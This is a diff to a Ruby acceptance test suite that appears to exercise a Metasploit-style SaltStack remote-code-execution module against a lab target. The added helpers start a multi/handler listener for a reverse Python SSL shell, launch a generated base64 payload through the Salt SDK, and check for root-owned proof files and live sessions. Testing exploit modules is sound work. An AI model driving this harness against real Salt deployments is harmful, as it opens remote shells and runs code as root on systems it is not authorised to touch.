@@ -66,6 +66,19 @@ module Acceptance
       JSON.parse(target_exec('framework', 'ruby', '-e', code, CALLBACK.to_s, STAGER.to_s))
     end
 
+    def sx_jobs
+      output = target_exec('target', 'python', '-c', File.read('test/module_targets/saltstack_rce/jobs.py'))
+      rows = sx_document(output, 'SALT_JOBS=')
+      sx_record('salt-job-results.jsonl', workspace: @workspace, rows: rows)
+      rows
+    end
+
+    def sx_document(output, prefix)
+      rows = output.lines.grep(/^#{Regexp.escape(prefix)}/)
+      expect(rows.length).to eq(1), output
+      JSON.parse(rows.fetch(0).delete_prefix(prefix))
+    end
+
     def sx_cleanup
       console_command('sessions -K')
       console_command('jobs -K')
@@ -80,7 +93,7 @@ module Acceptance
       values = {
         'TARGET' => target, 'PAYLOAD' => TARGETS.fetch(target).fetch(1),
         'LHOST' => listener_host, 'LPORT' => CALLBACK, 'SRVHOST' => listener_host,
-        'SRVPORT' => STAGER, 'ExitOnSession' => false, 'ConnectTimeout' => 3,
+        'SRVPORT' => STAGER, 'ConnectTimeout' => 3,
         'WfsDelay' => 15
       }.merge(options)
       begin
@@ -90,12 +103,13 @@ module Acceptance
           workspace: @workspace, action: action, target: target, options: values,
           wrapper_returned: !output.nil?, output: (output || console.all_data).dup.force_encoding(Encoding::UTF_8)
         })
+        sx_jobs
       end
       expect(output).not_to include('Unknown datastore option')
       output
     end
 
-    def sx_proof(identifier, payload)
+    def sx_proof(identifier, payload, owner: OWNER)
       path = "/tmp/module-target-salt-proof-#{SecureRandom.hex(6)}"
       value = "salt-session-#{SecureRandom.hex(12)}"
       proof = sx_json("SaltSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect})")
@@ -103,7 +117,7 @@ module Acceptance
       role = proof.fetch('role')
       expect(@native.fetch('cluster').fetch('roles').keys).to include(role)
       expect(proof.fetch('token')).to eq(@native.fetch('cluster').fetch('roles').fetch(role).fetch('token'))
-      expect(proof.fetch('via_exploit')).to eq(OWNER)
+      expect(proof.fetch('via_exploit')).to eq(owner)
       expect(target_exec('target', 'cat', path)).to eq(value)
       expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('0')
       pids = if proof.fetch('type') == 'meterpreter'
@@ -131,6 +145,33 @@ module Acceptance
       target_exec('target', 'rm', '-f', path)
       sx_record('session-proofs.jsonl', workspace: @workspace, proof: proof)
       proof
+    end
+
+    def sx_sdk_ssl
+      payload = 'cmd/unix/reverse_python_ssl'
+      expect(sx_json('framework.sessions.keys')).to eq([])
+      console_command('use exploit/multi/handler')
+      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => CALLBACK, 'ExitOnSession' => false }.each do |name, value|
+        console_command("set #{name} #{value}")
+      end
+      console_command('run -j -z')
+      jobs = sx_json('framework.jobs.keys')
+      expect(jobs.length).to eq(1)
+      generated = sx_json("RocketmqSessionControl.command(framework.jobs.fetch(#{jobs.first.inspect}),#{payload.inspect})")
+      output = target_exec('target', 'python', '-c', File.read('test/module_targets/saltstack_rce/sdk_launch.py'), generated.fetch('command_base64'))
+      launch = sx_document(output, 'SALT_SDK=')
+      sx_record('native-payload-dispatches.jsonl', workspace: @workspace, generated: generated, launch: launch)
+      expect(launch.fetch('status')).to eq('sdk_dispatched')
+      identifiers = nil
+      sx_poll(35) do
+        identifiers = sx_json('framework.sessions.keys')
+        expect(identifiers.length).to eq(1)
+      end
+      proof = sx_proof(identifiers.fetch(0), payload, owner: 'exploit/multi/handler')
+      expect(proof.fetch('role')).to eq('master')
+      sx_record('native-payload-calibrations.jsonl', workspace: @workspace, generated: generated, launch: launch, proof: proof)
+      sx_jobs
+      sx_cleanup
     end
 
     def sx_exploit(target, roles: TARGETS.fetch(target).fetch(2), options: {})
